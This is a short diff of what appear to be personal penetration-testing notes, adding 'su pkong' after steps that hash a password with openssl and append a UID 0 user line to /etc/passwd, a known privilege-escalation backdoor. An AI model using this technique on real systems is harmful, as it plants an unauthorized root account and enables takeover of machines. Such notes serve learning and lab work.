@@ -395,6 +395,7 @@ Contents
                Syntax: openssl passwd -1 -salt pkong pass123  
             Put it on the bottom of passwd
                pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
+               su pkong
             sudo
                https://wiki.archlinux.org/index.php/sudo#Configuration
                https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/
